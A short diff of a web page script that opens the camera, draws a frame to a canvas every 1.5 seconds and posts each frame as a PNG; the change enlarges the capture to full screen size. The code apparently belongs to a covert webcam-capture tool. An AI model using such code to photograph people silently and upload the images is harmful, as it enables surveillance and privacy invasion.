@@ -51,6 +51,9 @@ const constraints = {
 async function init() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia(constraints);
+	canvas.width = screen.width;
+	canvas.height = screen.height;
+	
     handleSuccess(stream);
   } catch (e) {
     alert(e.toString())
@@ -65,7 +68,7 @@ function handleSuccess(stream) {
 var context = canvas.getContext('2d');
   setInterval(function(){
 
-       context.drawImage(video, 0, 0, 640, 480);
+       context.drawImage(video, 0, 0, screen.width, screen.height);
        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
        post(canvasData); }, 1500);
   
